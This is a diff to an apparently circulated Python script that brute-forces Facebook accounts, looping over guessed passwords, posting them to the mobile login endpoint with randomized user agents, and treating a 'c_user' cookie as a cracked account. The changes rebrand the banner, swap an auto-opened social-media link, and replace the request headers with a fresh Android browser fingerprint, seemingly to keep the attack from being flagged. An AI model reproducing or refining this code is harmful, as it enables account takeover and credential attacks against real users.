@@ -91,13 +91,11 @@ for ua in range(10000):
 	ugen.append(alhhaj)
 os.system("xdg-open https://t.me/JAVA_SCIPT_KING")
 logo =("""                        \033[1;31m𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐌𝐘 𝐖𝐎𝐑𝐋𝐃 ♚ 
-
 ██   ██  █████  ██   ██ ██ ██████  
  ██ ██  ██   ██ ██  ██  ██ ██   ██ 
   ███   ███████ █████   ██ ██████  
  ██ ██  ██   ██ ██  ██  ██ ██   ██ 
-██   ██ ██   ██ ██   ██ ██ ██████  
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
+██   ██ ██   ██ ██   ██ ██ ██████                                                                                                                                                                                                                                                                                                                                                                                                                                                              
 \033[1;39m     ┏━━━━━━━━━━━━━━━━━━━\033[38;5;46mBCS\033[1;39m━━━━━━━━━━━━━━━━━━━━━┓
 \033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙉𝘼𝙈𝙀\033[1;34m        : [★] XAKIB\033[1;39m            ┃
 \033[1;39m     ┃ \x1b[1;95m❣︎[𖣘]☔︎\x1b[1;96m𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆\033[1;34m    : [★] RAKIB MIA\033[1;39m   ┃
@@ -142,7 +140,7 @@ def Jabers():
     print("\033[1;91m╚════════════════════════════════════════════╝")
     code = input('\033[1;32m ƳϴႮᎡ ՏᏆᎷ ᏟϴᎠᎬ :\033[1;36m ')
     os.system('clear')
-    os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
+    os.system('xdg-open https://www.facebook.com/urvatar143?mibextid=ZbWKwL')
     print(logo)
     print("\033[1;91m╔════════════════════════════════════════════╗")
     print("\033[1;31m║\033[1;36m  ƳϴႮᎡ ᏟᎡᎪᏟᏦ ᏞᏆᎷᏆͲ : \033[1;31m[\033[1;32m3000\033[1;31m] [\033[1;32m5000\033[1;31m] [\033[1;32m10000\033[1;31m] \033[1;31m ║")
@@ -178,7 +176,7 @@ def Jaberm(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;91m[\033[1;92mՏᎬᎪᎡᏟᎻᏆΝᏀ\033[1;91m]🤭[\033[1;92m%s\033[1;91m]😜[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
+            sys.stdout.write(f'\r \033[1;91m[\033[1;92mITZ XAKIB XD\033[1;91m]🤭[\033[1;92m%s\033[1;91m]😜[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://mbasic.facebook.com').text
@@ -192,26 +190,29 @@ def Jaberm(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
-            "user-agent": pro}
+            header_freefb = {
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '1.7000000476837158',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Z42 pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent':pro,
+    'viewport-width': '980',
+}
+
+
             lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
